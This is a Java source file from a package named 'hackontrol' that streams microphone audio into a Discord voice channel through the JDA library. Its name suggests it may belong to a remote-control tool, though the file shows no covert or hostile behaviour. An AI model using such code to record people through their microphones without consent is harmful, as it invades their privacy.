package com.khopan.hackontrol;

import java.nio.ByteBuffer;

import javax.sound.sampled.AudioInputStream;

import net.dv8tion.jda.api.audio.AudioSendHandler;

public class MicrophoneSendHandler implements AudioSendHandler {
	private final AudioInputStream audioStream;
	private final int size;

	public MicrophoneSendHandler(AudioInputStream audioStream, int size) {
		this.audioStream = audioStream;
		this.size = size;
	}

	@Override
	public boolean canProvide() {
		return true;
	}

	@Override
	public ByteBuffer provide20MsAudio() {
		try {
			return ByteBuffer.wrap(this.audioStream.readNBytes(this.size));
		} catch(Throwable Errors) {
			return ByteBuffer.allocate(0);
		}
	}
}
